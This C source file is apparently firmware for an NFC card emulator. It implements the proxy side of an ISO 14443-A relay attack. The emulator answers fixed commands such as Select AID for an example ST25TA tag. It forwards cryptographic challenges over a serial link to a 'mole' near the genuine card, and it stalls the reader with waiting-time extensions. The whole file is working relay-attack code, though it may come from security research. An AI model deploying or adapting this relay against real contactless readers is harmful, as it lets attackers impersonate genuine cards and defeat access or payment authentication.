/*
 * Proxy14443A.c
 *
 *  Created on: 20.05.2019
 *      Author: enrico
 */

#include "Proxy14443A.h"
#include "MifareClassic.h"

#include "ISO14443-3A.h"
#include "../Codec/ISO14443-2A.h"
#include "../Memory.h"
#include "Crypto1.h"
#include "../Random.h"

#define PROXY14443A_ATQA_VALUE     0x0004
#define PROXY14443A_SAK_VALUE 		0x20
#define SAK_UID_NOT_FINISHED		0x04

#define MEM_UID_CL1_ADDRESS         0x00
#define MEM_UID_CL1_SIZE            4
#define MEM_UID_BCC1_ADDRESS        0x04
#define MEM_UID_CL2_ADDRESS        	0x03
#define MEM_UID_CL2_SIZE            4

#define ACK_NAK_FRAME_SIZE          4         /* Bits */
#define ACK_VALUE                   0x0A
#define NAK_INVALID_ARG             0x00
#define NAK_CRC_ERROR               0x01
#define NAK_NOT_AUTHED              0x04
#define NAK_EEPROM_ERROR            0x05
#define NAK_OTHER_ERROR             0x06

#define CMD_HALT                    0x50
#define CMD_HALT_FRAME_SIZE         2        /* Bytes without CRCA */

#define CMD_RATS                    0xe0

#define APDU_REPLY_WAIT             (-1)
#define APDU_REPLY_NONE             (-2)

#define UNUSED(x) (void)(x)

/* Define victim of relay attack.
 *  Messages with a constant response (e.g. Select AID) will be responded to
 *  by the chameleon. Other messages (e.g. Cryptographic challenges) will be
 *  relayed via USARTE0 to the mole.
 *  In this example, the victim is a ST25TA tag. The Select AID response is
 *  hardcoded, but the "Select File" and "Read Binary" commands are relayed.
 * */
#define ST25TA
#ifdef ST25TA

#define ST25TA_RESP_TO_SELECT_LEN     2
#define ST25TA_RESP_TO_SELECT         ((const uint8_t *) "\x90\x00")

#define ST25TA_AID_LEN                7
#define ST25TA_AID                    ((const uint8_t *) \
                                        "\xd2\x76\x00\x00\x85\x01\x01")

static uint16_t SelectedFile;

#endif

static enum {
	STATE_HALT,
	STATE_IDLE,
	STATE_READY1,
	STATE_READY2,
	STATE_ACTIVE
} State;

static uint16_t CardATQAValue;
static uint8_t CardSAKValue;
static bool FromHalt = false;
static uint8_t BlockNumber;
static uint8_t WTXM;
static uint8_t OutBlock[270];
static uint16_t OutBlockSize;
static bool WaitingResponse;
static bool SerialHdrFound;
static int16_t SerialRespSize;
static uint16_t SerialRespRcvd;
static uint8_t SerialResp[257];

#define BYTE_SWAP(x) (((uint8_t)(x)>>4)|((uint8_t)(x)<<4))
#define NO_ACCESS 0x07


static void serial_send_byte(const uint8_t byte)
{
	while(!(USARTE0.STATUS & USART_DREIF_bm));
	USARTE0.DATA = byte;
}

static int16_t serial_recv_byte(void)
{
	if(!(USARTE0.STATUS & USART_RXCIF_bm)) {
		// There is no byte in the rx "message box"
		return -1;
	}
	// Any 8-bit value will be positive in the result
	uint8_t r = (uint8_t) USARTE0.DATA;
	return (int) r;
}

static void serial_send(const uint8_t* buffer, uint16_t len)
{
	for (int i = 0; i < len; i++) {
		serial_send_byte(*(buffer++));
	}
}

void Proxy14443AAppInit(void)
{
	State = STATE_IDLE;
	CardATQAValue = PROXY14443A_ATQA_VALUE;
	CardSAKValue = PROXY14443A_SAK_VALUE;
	FromHalt = false;
	BlockNumber = 0;
	OutBlockSize = 0;
	WaitingResponse = false;
	SerialHdrFound = false;
	SerialRespSize = -1;

	PORTE.DIR|=0x08; //set the direction of PE3 i.e. TXE0 as output and PE2 i.e. RXE0 as input
	//for baud rate 460800, BSEL=43, BSCALE=-4
	//for baud rate 230400, BSEL=51, BSCALE=-3
	//for baud rate 115200, BSEL=55, BSCALE=-2
	uint16_t BSEL = 55;
	int8_t BSCALE = -2;
	USARTE0.BAUDCTRLA = (uint8_t) (BSEL & 0xff);
	USARTE0.BAUDCTRLB = (uint8_t) (((BSEL & 0xf00) >> 8) + (BSCALE << 4));
	USARTE0.CTRLB|=USART_RXEN_bm|USART_TXEN_bm; //enable USART receiver and transmitter
	USARTE0.CTRLC|=USART_CHSIZE1_bm|USART_CHSIZE0_bm; //asynchronous mode, 8-bit character size, 1 stop bit, no parity
}

void Proxy14443AAppReset(void)
{
	State = STATE_IDLE;
	BlockNumber = 0;
	OutBlockSize = 0;
	if (WaitingResponse) {
		ISO14443ASendResponse(OutBlock, 0);
	}
	WaitingResponse = false;
	SerialHdrFound = false;
	SerialRespSize = -1;
	serial_send_byte('R');
}

void Proxy14443AAppTask(void)
{
	if (!SerialHdrFound) {
		uint16_t r = serial_recv_byte();
		if (r == 0x97) {
			// Response to the challenge will follow on USART
			SerialHdrFound = true;
			serial_send_byte(0x97);
			SerialRespSize = -1;
			SerialRespRcvd = 0;
		} else if (r == 0x98) {
			// Send out a keep-alive (WTX extension)
			if (WaitingResponse) {
				WaitingResponse = false;
				OutBlockSize = 4;
				memcpy(OutBlock, "\xf2\x01\x91\x40", OutBlockSize);
				ISO14443ASendResponse(OutBlock, OutBlockSize * BITS_PER_BYTE);
				serial_send_byte(0x98);
			}
		}
	}

	if (SerialHdrFound) {
		if (SerialRespSize < 0) {
			// The first byte after 0x97 is the length of the response
			SerialRespRcvd = 0;
			SerialRespSize = serial_recv_byte();
		}

		if (SerialRespRcvd < SerialRespSize) {
			// Receive one byte of the response
			int16_t r = serial_recv_byte();
			if (r >= 0) {
				SerialResp[SerialRespRcvd++] = (uint8_t) r;
				/*serial_send_byte(SerialRespSize - SerialRespRcvd);*/
			}
		}

		if (SerialRespRcvd == SerialRespSize) {
			SerialHdrFound = false;
		}
	}

	if (WaitingResponse) {
		if (SerialRespRcvd == SerialRespSize) {
			// The entire response was received
			const char *info = "Response received from USARTE0";
			LogEntry(LOG_INFO_GENERIC, info, strlen(info));

			serial_send_byte('W');
			WaitingResponse = false;
			OutBlockSize = SerialRespSize + 3;
			OutBlock[0] = 0x02 | (BlockNumber ? 1 : 0);
			memcpy(OutBlock+1, SerialResp, SerialRespSize);

			ISO14443AAppendCRCA(OutBlock, OutBlockSize - 2);
			ISO14443ASendResponse(OutBlock, OutBlockSize * BITS_PER_BYTE);
			
			SerialHdrFound = false;
			SerialRespSize = -1;
		}
	}
}

static int16_t Relay(const uint8_t* Buffer, uint16_t len) {
	/* forward to USARTE0 */
	serial_send_byte(0xAA);
	serial_send_byte((uint8_t) ((len >> 8) & 0xff));
	serial_send_byte((uint8_t) (len & 0xff));
	serial_send(Buffer, len);
	const char *info = "Challenge forwarded to USARTE0";
	LogEntry(LOG_INFO_GENERIC, info, strlen(info));

	return APDU_REPLY_WAIT;
}

static int16_t OnAPDU(const uint8_t* Buffer, uint16_t bufferLen, uint8_t* Response) {

	uint8_t cla = Buffer[0];
	uint8_t ins = Buffer[1];
	uint8_t p1 = Buffer[2];
	uint8_t p2 = Buffer[3];
	uint8_t lc = bufferLen == 5 ? 0 : Buffer[4];
	const uint8_t *data = bufferLen == 5 ? NULL : Buffer + 5;
	uint8_t lr = bufferLen == 5 ? Buffer[4] : Buffer[5 + lc];

	UNUSED(lr); UNUSED(p1);	UNUSED(p2);	UNUSED(cla);

	if (cla == 0 && ins == 0xa4 && p1 == 4 && p2 == 0) {
		/* Select AID */
#ifdef ST25TA
		if (lc == ST25TA_AID_LEN && 0 == memcmp(data, ST25TA_AID, ST25TA_AID_LEN)) {
			memcpy(Response, ST25TA_RESP_TO_SELECT, ST25TA_RESP_TO_SELECT_LEN);
			return ST25TA_RESP_TO_SELECT_LEN;
		}
#endif
		goto invalid_instruction;
	}

#ifdef ST25TA
	/* OEM proprietary messages (not really, this is just an example)*/
	if (cla == 0x00 && ins == 0xa4 && p1 == 0x00 && p2 == 0x0c && lc == 2) {
		return Relay(Buffer, bufferLen);
		/* Select File Command */
		SelectedFile = data[0] * 256 + data[1];
		/* respond 9000: Command successfully executed (OK). */
		memcpy(Response, "\x90\x00", 2);
		return 2;
	}
	if (cla == 0x00 && ins == 0xb0 && p1 == 0x00) {
		return Relay(Buffer, bufferLen);
		/* Read Binary Command */
		if (lc == 15) {
			memcpy(Response, "\x00\x0f\x20\x00\xff\x00\x36\x04\x06\x00\x01\x01\x00\x00\x00\x90\x00", lc + 2);
			return lc + 2;
		}
		if (lc == 2) {
			memcpy(Response, "\x00\x18\x90\x00", lc + 2);
			return lc + 2;
		}
		if (lc == 24) {
			memcpy(Response, "\xd1\x01\x14\x55\x01\x73\x74\x2e\x63\x6f\x6d\x2f\x63\x6c\x6f\x75\x64\x2d\x73\x74\x32\x35\x74\x61\x90\x00", lc + 2);
			return lc + 2;
		}
	}
#endif
	
invalid_instruction:
	/* respond 6D00: Instruction code not supported or invalid */
	memcpy(Response, "\x6d\x00", 2);
	return 2;
}

static uint16_t Block(uint8_t* Buffer, uint16_t BitCount)
{
	uint16_t byteCount = BitCount/8;

	serial_send_byte('U');

	if (byteCount < 2 || !ISO14443ACheckCRCA(Buffer, byteCount - 2)) {
		Buffer[0] = NAK_CRC_ERROR;
		return ACK_NAK_FRAME_SIZE;
	}

	/* Parse the PCB (this is the first byte) */
	uint8_t PCB = Buffer[0];
	bool cid_following = (PCB & 0x08) != 0;
	bool inf_following = false;

	bool nad_following = (PCB & 0x04) != 0;
	bool i_block = (PCB & 0xe2) == 0x02;
	bool chaining = i_block && (PCB & 0x10) != 0;

	bool r_block = (PCB & 0xe6) == 0xa2;
	bool ack = (PCB & 0xf0) == 0xa0;
	bool nak = (PCB & 0xf0) == 0xb0;

	bool s_block = (PCB & 0xc7) == 0xc2;
	bool wtx = (PCB & 0xf2) == 0xf2;
	bool deselect = (PCB & 0xf2) == 0xc2;

	bool block_number = (PCB & 0x01) == 0x01;

	UNUSED(ack); UNUSED(inf_following);

	/* Find the INF by skipping NAD and CID, if present */

	uint8_t *INF = Buffer + 1;
	/* length of INF is reduced by 2 by EDC, 1 by each of PCB, CID, NAD */
	uint16_t INF_len = byteCount - 3;
	if (cid_following) { INF++; INF_len--; };
	if (nad_following) { INF++; INF_len--; };
	inf_following = (INF_len > 0);

	if (i_block) {
		if (chaining) { goto format_error; }
		/* ISO/IEC 14443-4:2001 - 7.5.3.2 Rule D */
		BlockNumber = BlockNumber ? 0 : 1;
		if (!inf_following) {
			/* I-block without INF field! */
			/* ISO/IEC 14443-4:2001 - 7.5.4.3 Rule 10 */
			Buffer[0] = 0x02 | (Buffer[0] & 1);
			ISO14443AAppendCRCA(Buffer, 1);
			return 3 * BITS_PER_BYTE;
		}

		if (INF_len < 5) { goto format_error;	}
		uint8_t cmdLen = INF[4];
		if (INF_len > 5 && INF_len < 5 + cmdLen) { goto format_error; }
		
		int16_t apduReplyLen = OnAPDU(INF, INF_len, OutBlock + 1);
		if (apduReplyLen == APDU_REPLY_NONE) {
			goto format_error;
		} else if (apduReplyLen == APDU_REPLY_WAIT) {
			/* Ask for an extension of the waiting time */
			/* ISO/IEC 14443-4:2001 - 7.5.4.3 Rule 9 */
			OutBlockSize = 4;
			OutBlock[0] = 0xf2;
			OutBlock[1] = 0x1;
			ISO14443AAppendCRCA(OutBlock, OutBlockSize - 2);
			memcpy(Buffer, OutBlock, OutBlockSize);
			return OutBlockSize * BITS_PER_BYTE;
		} else if (apduReplyLen >= 0) {
			/* Send the response immediately */
			OutBlockSize = apduReplyLen + 3;
			OutBlock[0] = PCB & 0x03;
			ISO14443AAppendCRCA(OutBlock, OutBlockSize - 2);
			memcpy(Buffer, OutBlock, OutBlockSize);
			return OutBlockSize * BITS_PER_BYTE;
		}
	} else if (r_block) {
		if (block_number == BlockNumber) {
			/* ISO/IEC 14443-4:2001 - 7.5.4.3 Rule 11 */
			// The reader wants to keep alive the card by sending NACKs
			memcpy(Buffer, OutBlock, OutBlockSize);
			return OutBlockSize * BITS_PER_BYTE;
		} else {
			if (nak) {
				/* ISO/IEC 14443-4:2001 - 7.5.4.3 Rule 12 */
				Buffer[0] = 0xa2 | (~Buffer[0] & 1);
				ISO14443AAppendCRCA(Buffer, 1);
				return 3 * BITS_PER_BYTE;
			} else if (ack) {
				/* ISO/IEC 14443-4:2001 - 7.5.3.2 Rule E */
				BlockNumber = BlockNumber ? 0 : 1;
				// TODO: chaining
			}
		}
	} else if (s_block) {
		if (wtx && inf_following) {
			/* ISO/IEC 14443-4:2001 - 7.3 */
			WTXM = INF[0] & 0x3f;
			/* The actual response is sent by the task */
			WaitingResponse = true;
			return ISO14443A_APP_DELAYED_RESPONSE;
		} else if (deselect) {
			/* We are getting deselected, maybe we made a mistake? */
			Buffer[0] = 0xc2;
			ISO14443AAppendCRCA(Buffer, 1);
			return 3 * BITS_PER_BYTE;
		}
	}

format_error:
	LogEntry(LOG_INFO_APP_CMD_UNKNOWN, Buffer, byteCount);
	State = STATE_HALT;
	return ISO14443A_APP_NO_RESPONSE;

}

uint16_t Proxy14443AAppProcess(uint8_t* Buffer, uint16_t BitCount)
{
	uint16_t bitCount = BitCount;
	uint16_t byteCount = (BitCount+7)/8;

	/* Wakeup and Request may occure in all states */
	if ( (BitCount == 7) &&
			/* precheck of WUP/REQ because ISO14443AWakeUp destroys BitCount */
			(((State != STATE_HALT) && (Buffer[0] == ISO14443A_CMD_REQA)) ||
			 (Buffer[0] == ISO14443A_CMD_WUPA) )){
		FromHalt = State == STATE_HALT;
		if (ISO14443AWakeUp(Buffer, &BitCount, CardATQAValue, FromHalt)) {
			State = STATE_READY1;
			return BitCount;
		}
	}

	switch(State) {
		case STATE_IDLE:
		case STATE_HALT:
			FromHalt = State == STATE_HALT;
			if (ISO14443AWakeUp(Buffer, &BitCount, CardATQAValue, FromHalt)) {
				State = STATE_READY1;
				return BitCount;
			}
		case STATE_READY1:
			if (ISO14443AWakeUp(Buffer, &BitCount, CardATQAValue, FromHalt)) {
				State = FromHalt ? STATE_HALT : STATE_IDLE;
				return ISO14443A_APP_NO_RESPONSE;
			} else if (Buffer[0] == ISO14443A_CMD_SELECT_CL1) {
				/* Load UID CL1 and perform anticollision */
				uint8_t UidCL1[ISO14443A_CL_UID_SIZE];
				MemoryReadBlock(UidCL1, MEM_UID_CL1_ADDRESS, MEM_UID_CL1_SIZE);

				if (ISO14443ASelect(Buffer, &BitCount, UidCL1, CardSAKValue)) {
					State = STATE_ACTIVE;
					/* ISO/IEC 14443-4:2001 - 7.5.3.2 Rule C */
					BlockNumber = 1;
				}

				return BitCount;
			} else {
				/* Unknown command. Enter HALT state. */
				State = STATE_HALT;
			}
			break;

		case STATE_READY2:
			if (ISO14443AWakeUp(Buffer, &BitCount, CardATQAValue, FromHalt)) {
				State = FromHalt ? STATE_HALT : STATE_IDLE;
				return ISO14443A_APP_NO_RESPONSE;
			} else if (Buffer[0] == ISO14443A_CMD_SELECT_CL2) {
				/* Load UID CL2 and perform anticollision */
				uint8_t UidCL2[ISO14443A_CL_UID_SIZE];
				MemoryReadBlock(UidCL2, MEM_UID_CL2_ADDRESS, MEM_UID_CL2_SIZE);

				if (ISO14443ASelect(Buffer, &BitCount, UidCL2, CardSAKValue)) {
					State = STATE_ACTIVE;
					/* ISO/IEC 14443-4:2001 - 7.5.3.2 Rule C */
					BlockNumber = 1;
				}

				return BitCount;
			} else {
				/* Unknown command. Enter HALT state. */
				State = STATE_HALT;
			}
			break;
		case STATE_ACTIVE:
			if (ISO14443AWakeUp(Buffer, &BitCount, CardATQAValue, FromHalt)) {
				State = FromHalt ? STATE_HALT : STATE_IDLE;
				return ISO14443A_APP_NO_RESPONSE;
			} else if (Buffer[0] == CMD_HALT) {
				/* Halts the tag. According to the ISO14443, the second
				 * byte is supposed to be 0. */
				if (Buffer[1] == 0) {
					if (ISO14443ACheckCRCA(Buffer, CMD_HALT_FRAME_SIZE)) {
						/* According to ISO14443, we must not send anything
						 * in order to acknowledge the HALT command. */
						LogEntry(LOG_INFO_APP_CMD_HALT, NULL, 0);

						State = STATE_HALT;
						return ISO14443A_APP_NO_RESPONSE;
					} else {
						Buffer[0] = NAK_CRC_ERROR;
						return ACK_NAK_FRAME_SIZE;
					}
				} else {
					Buffer[0] = NAK_INVALID_ARG;
					return ACK_NAK_FRAME_SIZE;
				}
			} else if (Buffer[0] == CMD_RATS) {
				if (ISO14443ACheckCRCA(Buffer, byteCount - 2)) {
					const uint8_t ats[] = { 0x05, 0x78, 0x80, 0x78, 0x02, 0x65, 0x88 };
					memcpy(Buffer, ats, 7);

					return 7 * BITS_PER_BYTE;
				} else {
					Buffer[0] = NAK_CRC_ERROR;
					return ACK_NAK_FRAME_SIZE;
				}
			} else {
				return Block(Buffer, bitCount);
			}
			break;

		default:
			/* Unknown state? Should never happen. */
			break;
	}

	/* No response has been sent, when we reach here */
	return ISO14443A_APP_NO_RESPONSE;
}

void Proxy14443ATick(void)
{

}

void Proxy14443AGetUid(ConfigurationUidType Uid)
{
	if (ActiveConfiguration.UidSize == 7) {
		//Uid[0]=0x88;
		MemoryReadBlock(&Uid[0], MEM_UID_CL1_ADDRESS, MEM_UID_CL1_SIZE-1);
		MemoryReadBlock(&Uid[3], MEM_UID_CL2_ADDRESS, MEM_UID_CL2_SIZE);
	}
	else
		MemoryReadBlock(Uid, MEM_UID_CL1_ADDRESS, MEM_UID_CL1_SIZE);
}

void Proxy14443ASetUid(ConfigurationUidType Uid)
{
	if (ActiveConfiguration.UidSize == 7) {
		//Uid[0]=0x88;
		MemoryWriteBlock(Uid, MEM_UID_CL1_ADDRESS, ActiveConfiguration.UidSize);
	}
	else {
		uint8_t BCC = Uid[0] ^ Uid[1] ^ Uid[2] ^ Uid[3];

		MemoryWriteBlock(Uid, MEM_UID_CL1_ADDRESS, MEM_UID_CL1_SIZE);
		MemoryWriteBlock(&BCC, MEM_UID_BCC1_ADDRESS, ISO14443A_CL_BCC_SIZE);
	}
}

